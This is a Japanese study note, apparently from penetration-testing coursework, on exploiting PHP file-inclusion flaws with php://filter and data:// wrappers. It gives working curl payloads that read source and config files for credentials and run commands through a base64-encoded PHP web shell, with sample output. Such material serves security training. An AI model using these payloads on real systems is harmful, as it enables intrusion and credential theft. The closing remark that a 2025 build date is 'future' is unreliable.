# 概要
ラッパーを使用することで、PHPウェブアプリケーションにおけるフィルターを回避したり、ファイルインクルード脆弱性を利用してコードを実行したりすることができる

---
# php://filterラッパー
- ROT13やBase64などのエンコーディングの有無にかかわらず、ファイルの内容を表示 できる。
- php://filter を使用すると、.phpなどの実行可能ファイルの内容を実行せずに表示することもできる。これにより、PHPファイルに含まれる機密情報を検査し、Webアプリケーションのロジックを分析できる。

## resouce
- php://filterの必須パラメータ
- 絶対パスや相対パスを指定できる
```bash
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
```

認証情報を取得
```bash
http://192.168.0.104/?page=php://filter/read=convert.base64-encode/resource=config
```
この例では、configファイルの内容がBase64でエンコードされて出力される
## convert.base64-encode
- 出力をエンコードして表示できる
- デコードされたデータには、ユーザー名とパスワードを含む[_MySQL_](https://www.mysql.com/)接続情報が含まれている場合がある
- 出力されたbase64文字列をデコードする
```bash
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

デコード
```bash
echo base64-string | base64 -d
```
---
# data://ラッパー
- data://に続けてデータ型とコンテンツを指定する

```bash
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

## フィルタリング回避
- Webアプリケーションファイアウォールなどのセキュリティメカニズムが導入されている場合、「system」などの文字列やPHPコード要素がフィルタリングされることがある。このようなシナリオでは、 base64エンコードされたデータに**data://** ラッパーを使用することを検討できる。
- data://ラッパーはデフォルトのPHPインストールでは機能しない。これを利用するには、 allow_url_include 設定を有効にする必要がある。
### エンコード
```bash
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
```
### エンコード後の出力
```bash
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
```

### 例 ls（ディレクトリ内のファイル列挙）コマンド
```bash
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```
### uname -a（カーネルのバージョン表示）コマンド
```bash
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a" | grep generic
```
#### 出力の意味の分解
```bash
`Linux 7fa5bacf2009 5.4.0-212-generic #232-Ubuntu SMP Sat Mar 15 15:34:35 UTC 2025 x86_64 GNU/Linux`
```
| フィールド                          | 内容                                            |
| ------------------------------ | --------------------------------------------- |
| `Linux`                        | カーネル名                                         |
| `7fa5bacf2009`                 | ホスト名（DockerコンテナIDのようなもの）                      |
| `5.4.0-212-generic`            | カーネルバージョン                                     |
| `#232-Ubuntu`                  | カーネルビルド番号とディストリビューション名                        |
| `SMP`                          | 対称型マルチプロセッシング (Symmetric Multi-Processing) 対応 |
| `Sat Mar 15 15:34:35 UTC 2025` | カーネルのビルド日時                                    |
| `x86_64`                       | アーキテクチャ（64ビット）                                |
| `GNU/Linux`                    | OSファミリー（GNUツール群を使ったLinux）                     |

---

## 🔍 補足ポイント

- `7fa5bacf2009` は典型的な **Dockerコンテナのホスト名**。この出力はおそらく **Dockerなどの仮想化環境内での実行結果**。
    
- `5.4.0-212-generic` は Ubuntu 20.04 系でよく使われるカーネル系列の一部。
    
- `#232-Ubuntu` は、Ubuntuが独自にビルドしたカーネルであることを示しています。
    
- 日付が 2025年になっていることから、**未来の日付の仮想環境**での実行か、もしくはシステムクロックが意図的にずらされている可能性もあります。